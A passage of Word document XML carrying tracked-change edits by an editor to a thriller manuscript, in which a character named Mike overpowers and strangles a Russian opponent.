            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ed</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the trigger </w:t>
      </w:r>
      <w:del w:id="1323" w:author="TextVet" w:date="2016-03-18T14:46:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00B9126E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>except for a soft “</w:delText>
        </w:r>
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00B9126E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>bonk!</w:delText>
        </w:r>
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00B9126E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>” and a change in color of some lights</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1324" w:author="TextVet" w:date="2016-03-18T14:46:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">had </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1325" w:author="TextVet" w:date="2016-03-18T14:47:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">preluded the Russian’s </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1326" w:author="TextVet" w:date="2016-03-18T14:48:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">utter </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1327" w:author="TextVet" w:date="2016-03-18T14:47:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>agony</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:ins w:id="1328" w:author="TextVet" w:date="2016-03-18T14:48:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>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1329" w:author="TextVet" w:date="2016-03-18T14:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B9126E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">The man yelped in pain and surprise. </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">The burst in his ear </w:t>
      </w:r>
      <w:ins w:id="1330" w:author="TextVet" w:date="2016-03-18T14:50:00Z">
        <w:r w:rsidR="00A018CA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">having </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>thr</w:t>
      </w:r>
      <w:ins w:id="1331" w:author="TextVet" w:date="2016-03-18T14:48:00Z">
        <w:r w:rsidR="00B9126E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>o</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1332" w:author="TextVet" w:date="2016-03-18T14:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B9126E">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w</w:t>
      </w:r>
      <w:ins w:id="1333" w:author="TextVet" w:date="2016-03-18T14:50:00Z">
        <w:r w:rsidR="00A018CA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>n</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> him off-balance</w:t>
      </w:r>
      <w:ins w:id="1334" w:author="TextVet" w:date="2016-03-18T14:48:00Z">
        <w:r w:rsidR="00B9126E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1335" w:author="TextVet" w:date="2016-03-18T14:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B9126E">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336" w:author="TextVet" w:date="2016-03-18T14:48:00Z">
        <w:r w:rsidR="00B9126E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>h</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1337" w:author="TextVet" w:date="2016-03-18T14:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B9126E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>H</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">is hands still around Mike’s head, </w:t>
      </w:r>
      <w:ins w:id="1338" w:author="TextVet" w:date="2016-03-18T14:48:00Z">
        <w:r w:rsidR="00B9126E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:ins w:id="1339" w:author="TextVet" w:date="2016-03-18T14:48:00Z">
        <w:r w:rsidR="00B9126E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">Russian </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">stumbled in mid-kick, </w:t>
      </w:r>
      <w:ins w:id="1340" w:author="TextVet" w:date="2016-03-18T14:49:00Z">
        <w:r w:rsidR="00832E75">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>using</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1341" w:author="TextVet" w:date="2016-03-18T14:49:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00832E75">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>holding</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="1342" w:author="TextVet" w:date="2016-03-18T14:49:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00832E75">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">onto </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Mike </w:t>
      </w:r>
      <w:ins w:id="1343" w:author="TextVet" w:date="2016-03-18T14:49:00Z">
        <w:r w:rsidR="00832E75">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>as a stanchion</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1344" w:author="TextVet" w:date="2016-03-18T14:49:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00832E75">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>to remain upright</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a wide, sloppy sweep, Mike kicked the man’s legs out from under him. As he fell, Mike let himself fall with him. They hit the ground together. Mike, weighing easily a hundred pounds more than his opponent, used the man’s body to break his fall.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grunted, wriggled, and tried to push Mike off of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lay on top of the Russian like a bag of cement, refusing to yield. His broken face lay pressed against the ground next to the Russian’s. Mike slid his hands blindly toward the squirming man’s head, keeping his foe’s arms pinned with his bulk.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As the man punched and </w:t>
      </w:r>
      <w:ins w:id="1345" w:author="TextVet" w:date="2016-03-18T14:51:00Z">
        <w:r w:rsidR="00486722">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>writh</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1346" w:author="TextVet" w:date="2016-03-18T14:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00486722">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>struggl</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ed beneath him, Mike wrapped his fingers around his neck. He placed his thumbs across the Russian’s throat, stared down at him with eyes blank</w:t>
      </w:r>
      <w:del w:id="1347" w:author="TextVet" w:date="2016-03-18T14:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00260EA5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> and empty</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, and squeezed.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gasped and gulped</w:t>
      </w:r>
      <w:del w:id="1348" w:author="TextVet" w:date="2016-03-18T14:53:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FE414D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> for air</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, trying </w:t>
      </w:r>
      <w:del w:id="1349" w:author="TextVet" w:date="2016-03-18T14:53:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00071A45">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">in vain </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to heave Mike away. He tried kicking, punching, pushing, twisting</w:t>
      </w:r>
      <w:ins w:id="1350" w:author="TextVet" w:date="2016-03-18T15:05:00Z">
        <w:r w:rsidR="00BA2F2D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
        <w:r w:rsidR="00A00346">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1351" w:author="TextVet" w:date="2016-03-18T15:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008D6C01">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">, but </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nothing wo</w:t>
      </w:r>
      <w:ins w:id="1352" w:author="TextVet" w:date="2016-03-18T14:53:00Z">
        <w:r w:rsidR="00AD6A34">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>rked</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1353" w:author="TextVet" w:date="2016-03-18T14:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AD6A34">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>uld make Mike move</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Mike stared downward, as though he was looking through the Russian into some kind of empty space below the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Russian’s eyes </w:t>
      </w:r>
      <w:del w:id="1354" w:author="TextVet" w:date="2016-03-18T15:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F63323">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>turned bloodshot</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1355" w:author="TextVet" w:date="2016-03-18T15:06:00Z">
        <w:r w:rsidR="00F63323">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>rubied</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1356" w:author="TextVet" w:date="2016-03-18T14:54:00Z">
        <w:r w:rsidR="004646FB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1357" w:author="TextVet" w:date="2016-03-18T14:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004646FB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> and began to</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> moisten</w:t>
      </w:r>
      <w:ins w:id="1358" w:author="TextVet" w:date="2016-03-18T14:54:00Z">
        <w:r w:rsidR="004646FB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1359" w:author="TextVet" w:date="2016-03-18T14:55:00Z">
        <w:r w:rsidR="004646FB">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and </w:t>
      </w:r>
      <w:ins w:id="1360" w:author="TextVet" w:date="2016-03-18T14:54:00Z">
        <w:r w:rsidR="004646FB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">began </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bulg</w:t>
      </w:r>
      <w:ins w:id="1361" w:author="TextVet" w:date="2016-03-18T15:07:00Z">
        <w:r w:rsidR="002557E9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1362" w:author="TextVet" w:date="2016-03-18T15:07:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002557E9">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xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="1363" w:author="TextVet" w:date="2016-03-18T14:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004646FB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>out of</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1364" w:author="TextVet" w:date="2016-03-18T14:55:00Z">
        <w:r w:rsidR="004646FB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>from</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his face. His tongue swelled </w:t>
      </w:r>
      <w:del w:id="1365" w:author="TextVet" w:date="2016-03-18T14:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BA4A36">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>and stuck out of</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1366" w:author="TextVet" w:date="2016-03-18T14:55:00Z">
        <w:r w:rsidR="00BA4A36">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>from</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his mouth, </w:t>
      </w:r>
      <w:del w:id="1367" w:author="TextVet" w:date="2016-03-18T14:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00445A07">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">with </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">spittle foaming at the corners. His skin </w:t>
      </w:r>
      <w:ins w:id="1368" w:author="TextVet" w:date="2016-03-18T14:57:00Z">
        <w:r w:rsidR="0088666B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>became a</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1369" w:author="TextVet" w:date="2016-03-18T14:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0088666B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>turned a disturbing shade of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="1370" w:author="TextVet" w:date="2016-03-18T15:07:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C13C44">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
